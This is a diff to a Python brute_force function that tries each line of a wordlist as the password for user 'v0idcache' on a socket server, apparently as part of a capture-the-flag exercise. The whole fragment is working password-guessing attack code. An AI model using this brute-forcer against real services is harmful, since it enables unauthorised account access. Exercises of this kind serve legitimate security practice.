@@ -42,18 +42,28 @@ def brute_force():
             v0idcache's server.
     """
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   
     
 
-    username = "v0idcache"   # Hint: use OSINT
+    username = "v0idcache\n"   # Hint: use OSINT
     
     f = open(wordlist)
-    s.connect((host,port));
+    
     for line in f:
-        data = s.recv(2048)
-        print(data)
-	s.send(username)
-    	s.send(line)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host,port));
+        data = s.recv(1024)
+        s.send(username)
+        print(data + "   v0idcache")
+        data = s.recv(1024)
+    	s.send(line + "\n")
+        print(data + "\t" +  line)
+
+        data = s.recv(1024)
+
+        if data != "Fail\n":
+            print(data + " " + line)
+            break;
 
     s.close()
     f.close()
